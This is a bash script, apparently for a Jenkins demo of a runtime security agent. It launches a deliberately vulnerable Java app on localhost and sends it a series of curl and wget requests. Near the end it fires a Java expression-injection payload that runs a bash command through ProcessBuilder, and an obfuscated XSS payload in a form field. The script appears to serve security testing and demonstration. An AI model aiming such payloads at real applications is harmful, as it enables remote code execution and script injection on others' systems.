#!/bin/bash
# cp /var/jenkins_home/workspace/ShiftLeftDeveloperDemo/shiftleft.json.

$HOME/bin/sl run -- java -jar /var/jenkins_home/workspace/ShiftLeftDeveloperDemo/target/hello-shiftleft-0.0.1.jar --server.port=3030 &

sleep 60

# while true ; do \
curl -s localhost:3030/customers/2 >/dev/null ;\
sleep 5 ;\
curl -s localhost:3030/customers/1 >/dev/null ;\
sleep 5 ;\
curl -s localhost:3030/customers/1 >/dev/null ;\
curl -s localhost:3030/customers/1 >/dev/null ;\
sleep 5 ;\
curl -s localhost:3030/saveSettings >/dev/null ;\
sleep 5 ;\
curl -s localhost:3030/customers >/dev/null ;\
sleep 5 ;\
curl -s localhost:3030/search/user >/dev/null ;\
curl -s localhost:3030/ >/dev/null ;\
curl -s localhost:3030/account >/dev/null ;\
curl -s localhost:3030/account/3 >/dev/null ;\
curl -s localhost:3030/patients >/dev/null ;\
curl -s localhost:3030/patients >/dev/null ;\
curl -s localhost:3030/patients >/dev/null ;\

sleep 5 ;\

wget "localhost:3030/search/user?foo=new java.lang.ProcessBuilder({'/bin/bash','-c','echo 3vilhax0r>/tmp/hacked'}).start()" >/dev/null ;\
wget "localhost:3030/search/user?foo=new java.lang.ProcessBuilder({'/bin/bash','-c','echo 3vilhax0r>/tmp/hacked'}).start()" >/dev/null ;\

sleep 5 ;\

wget "localhost:3030/debug?customerId=1&clientId=1&firstName=a&lastName=b&dateOfBirth=123&ssn=123&socialSecurityNum=1&tin=123&phoneNumber=5432%3Cscriscriptpt%3Ealert(1)%3C/sscriptcript%3E" >/dev/null ;\

/bin/rm -f ./debug* > /dev/null
sleep 4 ;\
# done
